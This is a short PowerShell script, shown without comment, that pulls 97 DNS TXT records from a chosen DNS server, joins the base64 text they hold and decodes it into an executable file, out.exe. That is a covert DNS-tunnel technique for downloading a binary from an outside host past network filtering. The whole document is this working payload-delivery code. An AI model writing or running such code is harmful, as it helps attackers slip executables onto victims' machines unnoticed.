
$outfile = "out.exe"
$base64 = ""
for ($i=1; $i -le 97; $i=$i+1 ) 
{
    $dns_value = Resolve-DnsName "value$($i).secure.communications" -Type TXT -Server [IP.ip.iP.Ip];
    $txt = $dns_value.Strings
    $base64 = $base64 + $txt
    
}
$base_64_r = $base64 -replace "`t|`n|`r",""
Write-Output $base_64_r
[IO.File]::WriteAllBytes($outfile, [Convert]::FromBase64String($base_64_r))